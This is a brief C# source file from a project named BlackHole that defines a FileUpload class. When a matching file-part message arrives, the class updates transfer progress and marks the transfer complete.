using BlackHole.Common.Network.Protocol;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BlackHole.Master.Model
{
    /// <summary>
    /// 
    /// </summary>
    public sealed class FileUpload : FileTransaction
    {
        /// <summary>
        /// 
        /// </summary>
        /// <param name="id"></param>
        public FileUpload() : base(TransactionType.UPLOAD)
        {
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="part"></param>
        public override void OnPartDownloaded(DownloadedFilePartMessage downloadedPart)
        {
            if (downloadedPart == null)
                return;

            if (downloadedPart.Id != Id)
                return;
            
            Completed = downloadedPart.CurrentPart == downloadedPart.TotalPart;
            UpdateProgression(downloadedPart.CurrentPart, downloadedPart.TotalPart);
        }
    }
}
